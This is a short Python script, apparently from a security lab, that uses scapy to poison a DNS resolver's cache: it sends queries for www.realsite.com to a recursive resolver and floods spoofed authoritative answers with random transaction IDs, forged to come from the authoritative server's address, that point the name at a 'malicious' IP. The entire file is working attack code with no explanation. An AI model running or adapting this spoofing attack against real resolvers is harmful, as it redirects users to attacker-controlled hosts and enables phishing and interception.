from scapy.all import *
from random import randint

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

AUT_IP = "192.168.56.110"
REC_IP = "192.168.56.112"
MAL_IP = "192.168.56.111"

website = "www.realsite.com"
REC_UDP_PORT = 22222

request = IP(dst=REC_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=website))
response = (IP(dst=REC_IP, src=AUT_IP) / UDP(dport=REC_UDP_PORT, sport=53) /
            DNS(id=0, qr=1, aa=1, qd=request[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=1, arcount=0,
                an=(DNSRR(rrname=request[DNS].qd.qname, type='A', ttl=3600, rdata=MAL_IP))))

for x in range(0, 600):
    request[UDP].sport = x + 50000
    send(request, verbose=0)
    response[DNS].id = randint(0, 65536)
    send(response, verbose=0)
    print(x)
